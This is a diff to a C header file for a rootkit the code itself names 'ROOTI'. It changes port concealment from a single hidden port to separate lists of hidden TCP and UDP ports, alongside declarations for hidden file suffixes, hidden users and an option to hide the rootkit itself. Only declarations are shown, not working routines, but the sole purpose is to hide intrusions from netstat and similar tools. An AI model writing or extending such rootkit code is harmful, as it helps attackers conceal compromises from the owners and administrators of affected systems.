@@ -19,8 +19,13 @@ extern const size_t ROOTI_HIDDEN_FILES_SUFFIXES_COUNT;
 extern const char *ROOTI_HIDDEN_USERS[];
 extern const size_t ROOTI_HIDDEN_USERS_COUNT;
 
-// Port number to hide from tools like netstat
-#define ROOTI_HIDE_PORT 8080
+// TCP ports that should be hidden
+extern const unsigned short ROOTI_HIDDEN_TCP_PORTS[];
+extern const size_t ROOTI_HIDDEN_TCP_PORTS_COUNT;
+
+// UDP ports that should be hidden
+extern const unsigned short ROOTI_HIDDEN_UDP_PORTS[];
+extern const size_t ROOTI_HIDDEN_UDP_PORTS_COUNT;
 
 // Indicates whether this rootkit should be hidden by default
 // #define ROOTI_HIDEME_DEFAULT
